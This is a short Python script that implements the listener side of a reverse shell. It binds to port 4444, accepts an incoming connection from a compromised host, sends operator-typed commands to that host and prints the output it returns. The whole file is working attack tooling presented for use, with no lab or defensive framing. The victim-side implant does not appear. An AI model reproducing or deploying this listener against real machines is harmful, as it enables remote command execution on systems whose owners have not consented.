# _Modules:
from socket import *


class ReverseTcpConnection(object):
    def __init__(self, host, port):
        self.server = socket(AF_INET, SOCK_STREAM)
        self.server.bind((host, port))
        self.server.listen(1)

        self.clients = []

    def __call__(self, *args, **kwargs):
        print("_______________________________________________________________\n[+] Wating for connection")
        while True:
            client, addr = self.server.accept()
            self.clients.append([client, addr])
            print(f"[+] Successful connection from {addr[0]} and port {addr[1]}"
                  "\n_______________________________________________________________\n")


            if self.clients:
                while True:
                    pwd = client.recv(1024).decode()
                    # pwd = pwd + '>>> '
                    exc = input(pwd)

                    client.sendall(exc.encode())
                    data = client.recv(2048).decode()

                    if data == '\n[-] Bad command!\n':
                        print(data)
                        continue

                    else:
                        print('\n',data,'\n')


start = ReverseTcpConnection("", 4444)
start()

